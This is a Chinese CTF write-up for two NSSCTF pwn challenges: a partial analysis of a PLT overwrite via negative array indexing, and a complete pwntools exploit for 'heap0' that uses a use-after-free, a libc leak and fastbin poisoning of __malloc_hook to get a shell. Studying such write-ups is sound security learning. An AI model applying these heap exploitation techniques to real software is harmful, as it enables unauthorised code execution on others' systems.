---
title: NSSCTF PWN WP
date: '2025-03-22 13:50:12'
updated: '2025-04-13 18:31:11'
---
## 我地址呢
![](/images/15d12bc5a5fb1e751c95760e4db7fa8c.png)

就 plt 表 Partial RELRO，考虑从 plt 表下手

![](/images/21d1813a5b15702fa3da0009afc2a188.png)

题目还开了沙箱，ban 掉了 execve，只能 orw 了

刚开始看上去不知道从哪里下手，一看存的数据的数组是在 bss 段

![](/images/5866491cc8aa251f8171fbb7eca82e25.png)

![](/images/83449cf513404cf81dc35df34044345f.png)

试了试才知道原来数组索引可以是负数，got 和 plt 段都在 bss 段上面，

这样可以通过数组越界修改到上面的 plt 表

知道了 plt 表的修改方式，但是，怎么用呢...不知道怎么控制程序流

## heap0
libc 版本：2.23-0ubuntu11.3

![](/images/c687860016dee2f59909da38204a129c.png)

没有 PIE，有 canary，NX，got 表 Partial RELRO

堆指针放在 bss 段，有 UAF

![](/images/e3246743a8941f1b1d490ac5ba212702.png)

这里没有把指针置空

没想到这题这么简单...板子题...正好是我写过的第一道堆题

可惜比赛期间有事，没做，回头一看直接秒了...

exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("node5.buuoj.cn",28828)
link=process("./heap0")
libc=ELF("./glibc/2.23-0ubuntu11.3_amd64/libc.so.6")

def add(index,size,data):
    link.recvuntil(b'Enter your choice:')
    link.sendline(b'1')
    link.recvuntil(b'Enter index (0-9):')
    link.sendline(str(index))
    link.recvuntil(b'Enter size (1-256): ')
    link.sendline(str(size))
    link.recvuntil(b'Enter data: ')
    link.sendline(data)

def delete(index):
    link.recvuntil(b'Enter your choice:')
    link.sendline(b'2')
    link.recvuntil(b'Enter index (0-9):')
    link.sendline(str(index))

def show(index):
    link.recvuntil(b'Enter your choice:')
    link.sendline(b'3')
    link.recvuntil(b'Enter index (0-9):')
    link.sendline(str(index))

def edit(index,data):
    link.recvuntil(b'Enter your choice:')
    link.sendline(b'4')
    link.recvuntil(b'Enter index to edit (0-9):')
    link.sendline(str(index))
    link.recvuntil(b'Enter new data: ')
    link.sendline(data)

ogg=[0x4527a,0xf03a4,0xf1247]

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu11.3_amd64/')
# pause()

add(0,0x100,b'a')
add(1,0x60,b'a')
add(2,0x60,b'a')
delete(0)
show(0)
malloc_hook=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))-0x68
print(hex(malloc_hook))
fake_fast=malloc_hook-0x23
libc_base=malloc_hook-libc.symbols["__malloc_hook"]
print(hex(libc_base))
one_gadget=libc_base+ogg[2]

delete(1)
edit(1,p64(fake_fast))
add(3,0x60,b'a')
add(4,0x60,b'a'*0x13+p64(one_gadget))

link.recvuntil(b'Enter your choice:')
link.sendline(b'1')
link.recvuntil(b'Enter index (0-9):')
link.sendline(b'5')
link.recvuntil(b'Enter size (1-256): ')
link.sendline(b'100')

link.interactive()
```

